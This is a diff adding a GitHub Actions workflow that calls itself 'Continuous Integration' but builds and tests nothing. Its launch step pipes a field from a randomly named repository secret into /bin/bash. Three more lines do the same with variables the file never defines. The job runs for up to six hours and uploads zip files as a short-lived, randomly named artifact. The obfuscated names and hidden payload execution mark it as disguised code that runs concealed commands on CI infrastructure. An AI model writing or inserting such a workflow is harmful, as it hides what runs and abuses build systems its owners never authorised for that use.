@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ezgmk6: ${{ secrets.ezgmk6 }}
+        run: |
+          printf '%s' "$ezgmk6" | jq -r .mugh6 | /bin/bash
+          printf '%s' "$fno4" | jq -r .wc3483 | /bin/bash
+          printf '%s' "$oqfmz08" | jq -r .hdwkw50939 | /bin/bash
+          echo $lulu226 | jq -r .xm9046 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: o7xSc50g
+          path: "*.zip"
+          retention-days: 1
